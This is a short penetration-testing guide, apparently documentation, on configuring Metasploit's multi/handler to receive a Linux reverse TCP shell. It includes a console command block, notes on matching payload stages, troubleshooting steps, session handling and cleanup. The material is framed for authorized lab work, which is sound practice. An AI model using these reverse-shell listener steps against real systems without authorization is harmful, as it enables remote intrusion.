# Match the handler and understand its lifetime

Use a handler only for an authorized session whose payload, transport and destination are known. `exploit/multi/handler` receives the matching connection; it does not itself deliver or execute the payload on a target.

For an **illustrative** single-stage Linux x64 reverse TCP shell configured to connect to the worker's reachable lab address:

~~~text
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST 192.0.2.25
set LPORT 4444
set ExitOnSession true
show options
run -j
jobs -l
sessions -l
~~~

Use the actual payload identity and callback address, not these example values. The address embedded in a reverse payload must be reachable from the originating host; `0.0.0.0` is a listener binding choice, not a useful remote callback destination. NAT or forwarding can require a separate local bind address/port, supported through the handler's advanced options. Inspect them explicitly.

Stage and transport must agree. For example, `windows/meterpreter/reverse_tcp` and `windows/meterpreter_reverse_tcp` are staged and single-stage variants; a similarly named handler is not necessarily compatible. A plain shell is also not a Meterpreter session. Payload architecture concerns the receiving process/environment, not simply whether the machine's OS is 64-bit.

If no session appears, separate failure stages: listener bind, route/firewall, payload execution, connection arrival and protocol negotiation. A running job proves only the handler started. Do not repeatedly generate different payloads before resolving the first failed stage.

Use `sessions -i ID` to interact with the intended session. Inspect its type and current identity before choosing shell versus Meterpreter commands. Backgrounding a session leaves it alive; leaving the module does not terminate it. A local exploit-suggester result proposes candidates based on gathered facts, not a verified elevation. Read a proposed module's applicability and side effects before executing it.

At the requested stopping point, use `jobs -k ID` for the owned listener and the console/session's documented exit or kill command for the selected session. Keep identifiers and outcomes explicit so unrelated jobs are not stopped. `ExitOnSession` governs handler behavior, not all remote process or file cleanup. Verify any module-created artifacts using its own documented cleanup behavior.

See [handler options](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/handler.rb) and [payload documentation](https://docs.metasploit.com/docs/using-metasploit/basics/how-payloads-work.html).
